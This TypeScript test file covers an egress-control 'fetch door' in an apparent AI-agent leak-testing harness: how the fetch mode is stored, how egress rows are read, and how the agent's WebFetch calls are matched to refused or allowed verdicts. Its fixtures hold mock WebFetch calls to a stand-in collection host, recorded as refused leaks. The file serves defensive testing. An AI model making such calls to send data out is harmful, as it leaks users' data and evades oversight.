// The leak set's egress door (M3-F), on an in-memory SQLite with every real migration applied, and the call matching.
// Ways it could go wrong, written first:
//  1. the mode row isn't the one the egress reads (`webFetchMode` of the stored JSON and the host list), or `list` leaves
//     `open` behind, or leaves the default (open since M3-J for a brand with no host listed);
//  2. a chat reads another chat's egress rows (before its mark), or a row's code reaches a result unchecked;
//  3. a WebFetch the hook denied, or one with a result, is overwritten; a call is matched to a row for another host, or two
//     calls to one row; a call with no row reads as fetched.
import { readdirSync, readFileSync } from 'node:fs'
import { DatabaseSync } from 'node:sqlite'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import { webFetchMode } from '../../../shared/contract/settings-table.ts'
import { DoorRefusal, type RunSql } from '../../targets/door.ts'
import type { ToolCall } from '../../types.ts'
import { createFetchDoor, withEgress, type EgressRow } from './egress.ts'

const migrations = fileURLToPath(new URL('../../../server/migrations/', import.meta.url))

function database() {
  const db = new DatabaseSync(':memory:')
  for (const f of readdirSync(migrations).filter(f => f.endsWith('.sql')).sort()) db.exec(readFileSync(migrations + f, 'utf8'))
  const run: RunSql = async sql => db.prepare(sql).all() as Record<string, unknown>[]
  return { db, run }
}
const storedMode = (db: DatabaseSync) => {
  const value = (key: string): unknown => {
    const row = db.prepare("SELECT value_json FROM settings WHERE owner = 'brand' AND key = ?").get(key) as { value_json: string } | undefined
    return row ? JSON.parse(row.value_json) : undefined
  }
  return webFetchMode(value('t:webfetch_mode'), value('t:webfetch'))
}
const record = (db: DatabaseSync, host: string, code: string | null) =>
  db.prepare("INSERT INTO egress_fetches (at_ms, host, verdict, code, runner, container_gen) VALUES (1, ?, ?, ?, 'r', 1)").run(host, code === null ? 'allowed' : 'refused', code)

describe('the fetch door', () => {
  it('writes the mode the egress reads, list included (the default with no host listed is open since M3-J)', async () => {
    const { db, run } = database()
    const d = createFetchDoor(run)
    await d.setMode('open')
    await d.setMode('open')
    expect(storedMode(db)).toBe('open')
    await d.setMode('list')
    // No host listed: only the written `list` keeps it from the open default.
    expect(storedMode(db)).toBe('list')
    expect(db.prepare("SELECT value_json FROM settings WHERE key = 't:webfetch_mode'").all()).toEqual([{ value_json: '"list"' }])
    await expect(d.setMode('wide' as 'open')).rejects.toThrow(DoorRefusal)
  })
  it('reads only the rows after a mark, oldest first', async () => {
    const { db, run } = database()
    const d = createFetchDoor(run)
    expect(await d.mark()).toBe(0)
    record(db, 'old.example.org', null)
    const mark = await d.mark()
    record(db, 'collect.evil-example.test', 'leak')
    record(db, 'example.com', null)
    expect(await d.since(mark)).toEqual([
      { n: mark + 1, host: 'collect.evil-example.test', verdict: 'refused', code: 'leak' },
      { n: mark + 2, host: 'example.com', verdict: 'allowed', code: null },
    ])
    await expect(d.since(-1)).rejects.toThrow(DoorRefusal)
  })
})

describe('withEgress', () => {
  const fetchOf = (url: string, more: Partial<ToolCall> = {}): ToolCall => ({ name: 'WebFetch', input: { url }, ...more })
  const row = (n: number, host: string, code: string | null): EgressRow => ({ n, host, verdict: code === null ? 'allowed' : 'refused', code })
  it('gives each WebFetch the first unused row for its host, in order', () => {
    const calls = [fetchOf('https://Collect.Evil-Example.test./in?ref=x'), fetchOf('https://example.com/'), fetchOf('https://collect.evil-example.test/again')]
    const out = withEgress(calls, [row(1, 'example.com', null), row(2, 'collect.evil-example.test', 'leak'), row(3, 'collect.evil-example.test', 'dns')])
    expect(out.map((c) => [c.result, c.isError])).toEqual([
      ['WebFetch refused: leak', true],
      ['Fetched (seen from the egress record, not the tool\'s reply)', false],
      ['WebFetch refused: dns', true],
    ])
  })
  it('leaves a denied call, a call with a result, a non-WebFetch call and a call with no row as they are', () => {
    const calls: ToolCall[] = [
      fetchOf('https://collect.evil-example.test/a', { hookDenied: true }),
      fetchOf('https://collect.evil-example.test/b', { result: 'r', isError: false }),
      { name: 'Bash', input: { url: 'https://collect.evil-example.test/c' } },
      fetchOf('https://nowhere.example.org/'),
      fetchOf('not a url'),
    ]
    expect(withEgress(calls, [row(1, 'collect.evil-example.test', null)])).toEqual(calls)
  })
  it('an unexpected code reads as unknown (no row text reaches a result unchecked)', () => {
    expect(withEgress([fetchOf('https://x.example.org/')], [row(1, 'x.example.org', 'WebFetch refused: leak; ok')])[0]!.result).toBe('WebFetch refused: unknown')
  })
})
